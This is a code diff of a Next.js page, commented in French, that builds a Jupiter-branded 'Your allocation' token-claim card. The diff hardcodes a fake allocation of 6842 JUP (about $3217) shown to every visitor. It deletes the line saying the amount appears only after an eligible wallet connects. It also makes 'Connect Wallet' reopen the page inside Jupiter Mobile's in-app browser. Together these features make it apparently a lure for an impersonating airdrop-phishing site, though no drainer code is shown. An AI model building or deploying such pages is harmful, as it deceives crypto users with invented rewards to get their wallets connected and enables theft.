@@ -1,13 +1,52 @@
 import Head from 'next/head'
+import { useEffect, useState } from 'react'
 
 /*
- * Ecran "in-Jupiter" atteint apres la transition : une carte de reclamation.
- * C'est une piece d'UI, donc entierement en code (pas d'image de fond). Le
- * seul visuel importe est le logo Jupiter, decoupe de la maquette.
- * Un reflet balaie le panneau Your allocation et le bouton Connect Wallet.
+ * Ecran atteint apres la transition : une carte de reclamation. C'est une
+ * piece d'UI, donc entierement en code. Le seul visuel importe est le logo
+ * Jupiter. Un reflet balaie le panneau Your allocation et le bouton Connect
+ * Wallet. L'allocation se revele par un defilement de chiffres, puis affiche
+ * le montant en dollars. Connect Wallet ouvre Jupiter Mobile.
  */
 
+const ALLOCATION = 6842   // JUP attribues
+const DOLLARS = 3217      // ~ valeur en dollars
+const OUVRIR_DANS_JUPITER = (url) => `jupiter://browse/${encodeURIComponent(url)}`
+const INSTALLER_JUPITER = 'https://jup.ag/mobile'
+
+const format = (n) => Math.round(n).toLocaleString('en-US')
+
 export default function Connect() {
+  const [jup, setJup] = useState(0)
+  const [revele, setRevele] = useState(false)
+
+  // Defilement des chiffres jusqu'a l'allocation, puis on montre les dollars
+  useEffect(() => {
+    const debut = performance.now()
+    const duree = 1700
+    let raf
+    const tick = (t) => {
+      const p = Math.min((t - debut) / duree, 1)
+      const e = 1 - Math.pow(1 - p, 3)
+      setJup(ALLOCATION * e)
+      if (p < 1) raf = requestAnimationFrame(tick)
+      else setRevele(true)
+    }
+    raf = requestAnimationFrame(tick)
+    return () => cancelAnimationFrame(raf)
+  }, [])
+
+  // Connect Wallet : ouvre Jupiter Mobile sur cette page
+  const connecter = () => {
+    if (new URLSearchParams(window.location.search).get('jup') === '1') return
+    const url = `${window.location.origin}/connect?jup=1`
+    const repli = setTimeout(() => {
+      if (document.visibilityState === 'visible') window.location.href = INSTALLER_JUPITER
+    }, 1500)
+    window.addEventListener('pagehide', () => clearTimeout(repli), { once: true })
+    window.location.href = OUVRIR_DANS_JUPITER(url)
+  }
+
   return (
     <>
       <Head>
@@ -61,12 +100,18 @@ export default function Connect() {
           background: rgba(10,16,30,0.45); border: 1px solid rgba(120,150,200,0.14);
         }
         .p-label { font-size: 13px; font-weight: 700; letter-spacing: 0.12em; color: #808ea3; }
-        .p-ligne { display: flex; align-items: center; gap: 10px; margin-top: 16px; }
-        .case { flex: 1 1 0; min-width: 0; max-width: 44px; aspect-ratio: 1 / 1; border-radius: 11px; background: #171f30; }
-        .p-jup { display: flex; align-items: center; gap: 10px; margin-left: 4px; flex: 0 0 auto; }
-        .p-jup img { width: 30px; height: 30px; }
-        .p-jup span { font-size: 27px; font-weight: 700; color: #5f83e8; }
-        .p-note { font-size: 16px; color: #8b98ab; margin-top: 16px; }
+        .p-montant { display: flex; align-items: baseline; gap: 11px; margin-top: 14px; }
+        .p-montant img { width: 34px; height: 34px; align-self: center; }
+        .p-nb {
+          font-size: 40px; font-weight: 800; color: #fff; letter-spacing: -0.01em;
+          font-variant-numeric: tabular-nums; font-feature-settings: "tnum";
+        }
+        .p-unite { font-size: 24px; font-weight: 700; color: #5f83e8; }
+        .p-usd {
+          font-size: 19px; font-weight: 600; color: #34d399; margin-top: 10px;
+          opacity: 0; transform: translateY(4px); transition: opacity .4s ease, transform .4s ease;
+        }
+        .p-usd-on { opacity: 1; transform: translateY(0); }
 
         .rang { display: flex; align-items: center; justify-content: space-between; padding: 16px 2px; }
         .rang + .rang { border-top: 1px solid rgba(120,150,200,0.12); }
@@ -113,11 +158,12 @@ export default function Connect() {
 
         <div className="panneau brille">
           <div className="p-label">YOUR ALLOCATION</div>
-          <div className="p-ligne">
-            <span className="case" /><span className="case" /><span className="case" /><span className="case" />
-            <span className="p-jup"><img src="/assets/jupiter-logo.png" alt="" /><span>JUP</span></span>
+          <div className="p-montant">
+            <img src="/assets/jupiter-logo.png" alt="" />
+            <span className="p-nb">{format(jup)}</span>
+            <span className="p-unite">JUP</span>
           </div>
-          <div className="p-note">Shown after an eligible wallet connects.</div>
+          <div className={`p-usd ${revele ? 'p-usd-on' : ''}`}>&asymp; ${format(DOLLARS)}</div>
         </div>
 
         <div className="rang">
@@ -129,7 +175,7 @@ export default function Connect() {
           <span className="rang-val"><img src="/assets/jupiter-logo.png" alt="" />JUP on Solana</span>
         </div>
 
-        <button className="cw brille">Connect Wallet</button>
+        <button className="cw brille" onClick={connecter}>Connect Wallet</button>
 
         <div className="pied">
           <svg viewBox="0 0 24 24" fill="none" stroke="#8b98ab" strokeWidth="2"><path d="M12 3l7 3v5c0 4-3 7-7 8-4-1-7-4-7-8V6z" strokeLinejoin="round" /></svg>
